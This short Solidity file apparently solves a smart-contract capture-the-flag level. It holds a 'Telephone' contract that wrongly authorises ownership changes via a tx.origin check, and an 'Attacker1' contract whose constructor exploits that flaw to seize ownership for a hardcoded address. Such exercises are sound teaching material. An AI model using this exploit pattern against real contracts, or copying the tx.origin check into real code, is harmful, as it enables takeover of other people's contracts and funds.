pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attacker1 {

    Telephone target;

    constructor(Telephone _telphone) payable public {
        target = Telephone(_telphone);

        target.changeOwner(0x1C67015f5c48573B6DFeAFAD514e68dB9F009378);
    }
}
